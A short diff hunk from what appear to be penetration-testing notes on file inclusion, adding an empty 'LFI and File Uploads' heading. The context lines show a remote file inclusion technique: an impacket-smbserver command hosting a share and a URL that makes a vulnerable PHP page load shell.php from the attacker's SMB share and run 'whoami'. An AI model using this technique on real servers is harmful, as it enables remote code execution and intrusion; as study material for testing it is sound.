@@ -103,3 +103,5 @@ impacket-smbserver -smb2support share $(pwd)
 Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=\\<OUR_IP>\share\shell.php&cmd=whoami`
 <br>*Note: we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default*
 
+### LFI and File Uploads
+
